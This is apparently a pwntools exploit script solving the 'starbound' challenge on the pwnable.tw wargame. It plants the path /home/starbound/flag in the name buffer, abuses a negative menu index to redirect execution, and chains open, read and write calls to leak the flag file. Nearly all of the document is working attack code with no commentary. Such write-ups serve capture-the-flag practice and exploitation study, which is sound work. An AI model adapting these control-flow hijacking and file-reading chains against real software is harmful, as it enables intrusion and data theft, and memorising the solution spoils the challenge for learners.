#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('starbound', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+88

        c
        ''')
        sleep(1)

# nc chall.pwnable.tw 10202
if args.REMOTE:
    p = remote('chall.pwnable.tw', 10202)
else:
    p = process([exe.path])

sa(b'> ', b'6')
sa(b'> ', b'2')
# 0x08048e48
vuln = 0x08048e48

name = flat(
    b'/home/starbound/flag\0'.ljust(88, b'\0'),
    p64(vuln),

)

sa(b'Enter your name: ', name)


GDB()
path = 0x80580d0
load = flat(
    b'-11'.ljust(0x8, b'a'),
    (exe.plt.open),
    vuln,
    path, 0, 0,
    b'a'*0x10,
    exe.plt.read,
    vuln,
    3, exe.sym.me, 0x50,
    b'a'*0x10,
    exe.plt.write,
    exe.sym.main,
    1, exe.sym.me, 0x50
)

sa(b'> ', load)


p.interactive()
